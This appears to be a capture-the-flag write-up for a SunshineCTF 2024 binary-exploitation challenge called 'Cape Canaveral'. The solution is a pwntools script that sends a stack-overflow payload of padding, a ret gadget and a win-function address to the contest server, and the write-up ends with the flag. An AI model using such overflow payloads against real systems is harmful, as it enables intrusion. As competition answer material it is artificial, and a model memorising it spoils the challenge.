# Cape Canaveral

Solved by: @n3r

## Question:
Drive your way to the greatest Space Coast in the United States!

## Solution:
```
from pwn import *

elf = context.binary = ELF('./canaveral', checksec=False)
#p = process()
p = remote('2024.sunshinectf.games', 24602)

win = 0x00000000004011b6
offset = 112
ret = 0x000000000040101a

payload = b'A'*offset
payload += b'B'*8
payload += p64(ret)
payload += p64(win)

#print(payload)
p.sendlineafter(b':', payload)
p.interactive()
```

**Flag:** `sun{Wait, that duck isn't a duck, it's really a polar bear.}`
